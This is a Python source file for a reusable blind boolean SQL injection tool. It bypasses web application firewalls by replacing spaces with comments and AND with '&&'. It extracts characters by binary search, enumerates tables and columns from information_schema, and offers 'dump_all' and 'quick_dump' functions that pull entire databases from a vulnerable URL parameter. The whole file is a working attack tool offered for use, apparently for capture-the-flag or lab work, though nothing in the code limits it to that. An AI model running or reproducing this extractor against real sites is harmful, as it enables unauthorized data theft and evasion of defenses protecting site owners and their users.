#!/usr/bin/env python3
"""Generic boolean-based blind SQLi extractor with WAF bypass support.

Supports:
- Binary search extraction (8 req/char, default)
- Linear charset extraction (for small charsets)
- WAF bypass: /**/ for space, && for AND
- Automatic keyword blocking detection
- Table/column/data extraction from information_schema

Usage:
    from tools.feeder.blind_sqli_extractor import BlindSqliExtractor

    b = BlindSqliExtractor(
        target="http://target.com/vuln.php",
        param="id",
        true_size=6106,          # response size when condition is TRUE
        waf_keywords=["limit", "table", "handler", "union"],
        space_bypass="/**/",
        and_bypass="&&",
    )
    tables = b.extract_tables()
    for t in tables:
        cols = b.extract_columns(t)
        data = b.extract_data(t, cols)
"""

import requests
import urllib.parse
import binascii


class BlindSqliExtractor:
    def __init__(self, target, param="id", true_size=6106,
                 waf_keywords=None, space_bypass="/**/", and_bypass="&&",
                 prefix="", suffix="", timeout=10):
        self.target = target
        self.param = param
        self.true_size = true_size
        self.waf_keywords = set(waf_keywords or [])
        self.space = space_bypass
        self.andinj = and_bypass
        self.prefix = prefix
        self.suffix = suffix
        self.timeout = timeout
        self._blocked_keywords = set()

    def test(self, condition):
        """Test boolean condition. Returns True/False/None(blocked)."""
        payload = "%s%s(%s)%s" % (self.prefix, self.andinj, condition, self.suffix)
        url = "%s?%s=%s" % (self.target, self.param, urllib.parse.quote(payload))
        try:
            r = requests.get(url, timeout=self.timeout)
            for kw in self.waf_keywords:
                if kw.lower() in r.text.lower():
                    self._blocked_keywords.add(kw)
                    return None
            return len(r.content) == self.true_size
        except Exception as e:
            return False

    def extract_string(self, query, max_len=300):
        """Extract string via binary search per character. ~8 req/char."""
        # Length via binary search
        lo, hi = 0, max_len
        length = None
        while lo <= hi:
            mid = (lo + hi) // 2
            r = self.test("length((%s))>%d" % (query, mid))
            if r is None:
                return None
            if r:
                lo = mid + 1
            else:
                r2 = self.test("length((%s))=%d" % (query, mid))
                if r2 is None:
                    return None
                if r2:
                    length = mid
                    break
                hi = mid - 1

        if length is None:
            return None
        if length == 0:
            return ""

        result = ""
        for pos in range(1, length + 1):
            lo, hi = 0, 255
            while lo <= hi:
                mid = (lo + hi) // 2
                r = self.test("ord(substr((%s),%d,1))=%d" % (query, pos, mid))
                if r is None:
                    return result
                if r:
                    result += chr(mid)
                    break
                lt = self.test("ord(substr((%s),%d,1))<%d" % (query, pos, mid))
                if lt is None:
                    return result
                if lt:
                    hi = mid - 1
                else:
                    lo = mid + 1
            if len(result) < pos:
                result += '?'

        return result

    def extract_tables(self):
        """Extract table names from information_schema."""
        q = "select%sgroup_concat(table_name)%sfrom%sinformation_schema.tables%swhere%stable_schema=database()" % (
            self.space, self.space, self.space, self.space, self.space)
        result = self.extract_string(q, 200)
        if not result:
            return []
        return [t for t in result.split(',') if t]

    def extract_columns(self, table_name):
        """Extract column names for a table."""
        hex_name = binascii.hexlify(table_name.encode()).decode()
        q = "select%sgroup_concat(column_name)%sfrom%sinformation_schema.columns%swhere%stable_name=0x%s" % (
            self.space, self.space, self.space, self.space, hex_name)
        result = self.extract_string(q, 500)
        if not result:
            return []
        return [c for c in result.split(',') if c]

    def count_rows(self, table_name):
        """Count rows in a table."""
        count = 0
        for i in range(50):
            r = self.test("(select%scount(*)%sfrom%s`%s`)=%d" % (
                self.space, self.space, self.space, table_name, i))
            if r is None:
                return -1
            if r:
                return i
        return -1

    def extract_data(self, table_name, columns, max_len=1000):
        """Extract data from a table (all rows concatenated with | separator)."""
        concat_parts = []
        for c in columns:
            concat_parts.append("ifnull(`%s`,char(78,85,76,76))" % c)
        concat_expr = "concat_ws(char(124)," + ",".join(concat_parts) + ")"

        q = "select%sgroup_concat(%s)%sfrom%s`%s`" % (
            self.space, concat_expr, self.space, self.space, table_name)
        return self.extract_string(q, max_len)

    def dump_all(self):
        """Full database dump: tables → columns → data."""
        results = {}
        tables = self.extract_tables()
        results['_tables'] = tables

        for tname in tables:
            cols = self.extract_columns(tname)
            count = self.count_rows(tname)
            info = {'columns': cols, 'row_count': count}

            if count > 0 and count <= 10:
                data = self.extract_data(tname, cols)
                info['data'] = data

            results[tname] = info

        return results


# Convenience function
def quick_dump(target_url, param="id", true_size=6106,
               waf=None, space="/**/", and_op="&&"):
    """One-shot blind SQLi dump."""
    b = BlindSqliExtractor(
        target=target_url, param=param, true_size=true_size,
        waf_keywords=waf, space_bypass=space, and_bypass=and_op)
    return b.dump_all()
